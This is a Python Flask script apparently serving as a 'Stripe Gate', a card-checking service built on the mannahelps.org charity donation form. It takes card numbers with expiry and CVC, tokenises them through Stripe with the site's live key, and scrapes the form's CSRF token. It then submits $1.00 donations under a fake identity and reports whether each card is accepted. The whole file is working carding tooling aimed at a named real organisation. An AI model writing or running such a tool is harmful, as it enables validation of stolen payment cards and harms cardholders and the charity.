import requests
import json
import re
from urllib.parse import unquote
from flask import Flask, request, jsonify

app = Flask(__name__)
session = requests.Session()

# -------------------------------------------------
# 1. CLEAN RESPONSE PARSER
# -------------------------------------------------
def log_final_response(response):
    try:
        # Try JSON first
        try:
            data = response.json()
            if 'error' in data:
                code = data['error'].get('code', '')
                msg  = data['error'].get('message', '')
            else:
                code = ''
                msg  = data
        except json.JSONDecodeError:
            # HTML fallback
            html = response.text

            # Remove noisy "Param is:" lines
            html = re.sub(r'[\r\n]+Param\s*is:.*?(?=[\r\n]|<)', '', html, flags=re.I)

            # Extract Code / Message cleanly
            code_match = re.search(r'Code\s*is:\s*([^<\n]+)', html, re.I)
            msg_match  = re.search(r'Message\s*is:\s*([^<\n]+)', html, re.I)

            code = code_match.group(1).strip() if code_match else ''
            msg  = msg_match.group(1).strip() if msg_match else 'Unknown error'

        result = {
            "error_code": code,
            "response": {
                "code": code,
                "message": msg
            }
        }

    except Exception as e:
        result = {
            "error_code": "parse_error",
            "response": {
                "code": "parse_error",
                "message": f"Parse failed: {str(e)}"
            }
        }

    print(json.dumps(result, indent=2))
    return result


# -------------------------------------------------
# 2. CSRF TOKEN FETCH
# -------------------------------------------------
def get_csrf_token():
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
        'referer': 'https://www.mannahelps.org/donate/food/',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }
    try:
        r = session.get('https://www.mannahelps.org/donate/money/', headers=headers, timeout=15)
        m = re.search(r'name="csrf_token"\s+value="([^"]+)"', r.text)
        return m.group(1) if m else None
    except:
        return None


# -------------------------------------------------
# 3. STRIPE TOKEN CREATION
# -------------------------------------------------
def create_stripe_token(cc, mm, yy, cvc):
    if len(yy) == 2:
        yy = '20' + yy

    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
    }

    payload = (
        f'key=pk_live_7EhDaYyXbPLKSk9IhDTiU0Kr'
        f'&payment_user_agent=stripe.js%2F78ef418'
        f'&card[number]={cc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&card[cvc]={cvc}'
        f'&card[name]=Test+User'
        f'&card[address_line1]=123+Main+St'
        f'&card[address_city]=Miami'
        f'&card[address_state]=FL'
        f'&card[address_zip]=33101'
    )

    try:
        r = session.post('https://api.stripe.com/v1/tokens', headers=headers, data=payload, timeout=20)
        j = r.json()
        return j.get('id'), None
    except Exception as e:
        return None, f"Stripe token error: {str(e)}"


# -------------------------------------------------
# 4. SUBMIT DONATION
# -------------------------------------------------
def submit_donation(stripe_token):
    csrf = get_csrf_token()
    if not csrf:
        return {"error_code": "csrf_failed", "response": {"code": "csrf_failed", "message": "CSRF token missing"}}

    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.mannahelps.org',
        'referer': 'https://www.mannahelps.org/donate/money/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }

    data = [
        ('account', 'Programs/Services'), ('amount', 'other'), ('amnto-text', '1'),
        ('name', 'Test User'), ('email', 'test@example.com'), ('comfirmAddress', 'test@example.com'),
        ('phone', '5551234567'), ('address_line1', '123 Main St'), ('address_city', 'Miami'),
        ('address_state', 'FL'), ('address_zip', '33101'), ('formID', 'donate'),
        ('csrf_token', csrf), ('id', 'Manna Donation'), ('itemInfo', 'One-Time Donation'),
        ('interval', '1'), ('amountInput', '1.00'), ('id', 'Payment'),
        ('utm_source', 'null'), ('utm_medium', 'null'), ('utm_campaign', 'null'),
        ('gclid', 'null'), ('stripeToken', stripe_token),
    ]

    try:
        r = session.post('https://www.mannahelps.org/checkout/payment.php', headers=headers, data=data, timeout=30)
        return log_final_response(r)
    except Exception as e:
        return {"error_code": "submit_error", "response": {"code": "submit_error", "message": str(e)}}


# -------------------------------------------------
# 5. MAIN ENDPOINT WITH CVC & AMEX VALIDATION
# -------------------------------------------------
@app.route('/gate=stripe1$/cc=<path:card>', methods=['GET'])
def stripe_gate(card):
    try:
        decoded = unquote(card)
        parts = [p.strip() for p in decoded.split('|')]
        if len(parts) != 4:
            return jsonify({
                "error_code": "invalid_format",
                "response": {"code": "invalid_format", "message": "Use: cc|mm|yy|cvc"}
            }), 400

        cc, mm, yy, cvc = parts

        # --- BASIC VALIDATION ---
        if not mm.isdigit() or not (1 <= int(mm) <= 12):
            return jsonify({"error_code": "invalid_mm", "response": {"code": "invalid_mm", "message": "Invalid month"}}), 400
        if not yy.isdigit() or len(yy) not in [2, 4]:
            return jsonify({"error_code": "invalid_yy", "response": {"code": "invalid_yy", "message": "Invalid year"}}), 400
        if not cvc.isdigit():
            return jsonify({"error_code": "invalid_cvc", "response": {"code": "invalid_cvc", "message": "CVC must be digits"}}), 400

        # --- AMEX CVC LOGIC ---
        is_amex = cc.startswith('3')
        cvc_len = len(cvc)

        if is_amex:
            if cvc_len != 4:
                return jsonify({
                    "error_code": "incorrect_cvc",
                    "response": {
                        "code": "incorrect_cvc",
                        "message": "Your card's security code is invalid"
                    }
                }), 400
        else:
            if cvc_len != 3:
                return jsonify({
                    "error_code": "incorrect_cvc",
                    "response": {
                        "code": "incorrect_cvc",
                        "message": "Your card's security code is invalid"
                    }
                }), 400

        # --- CREATE TOKEN ---
        token, err = create_stripe_token(cc, mm, yy, cvc)
        if not token:
            return jsonify({
                "error_code": "token_failed",
                "response": {"code": "token_failed", "message": err or "Token creation failed"}
            }), 400

        # --- SUBMIT ---
        return jsonify(submit_donation(token)), 200

    except Exception as e:
        return jsonify({
            "error_code": "server_error",
            "response": {"code": "server_error", "message": f"Server error: {str(e)}"}
        }), 500


# -------------------------------------------------
# 6. HOME PAGE
# -------------------------------------------------
@app.route('/')
def home():
    return """
    <h2>Stripe Gate v2 – MannaHelps.org</h2>
    <p><b>Endpoint:</b> <code>/gate=stripe1$/cc=371449635398431|12|27|1234</code></p>
    <p><b>Format:</b> <code>cc|mm|yy|cvc</code></p>
    <p><b>Rules:</b></p>
    <ul>
      <li>Amex (starts with 3) → 4-digit CVC only</li>
      <li>All others → 3-digit CVC only</li>
    </ul>
    <p>Charges $1.00</p>
    """


if __name__ == '__main__':
    print("Gate running → http://127.0.0.1:5000")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
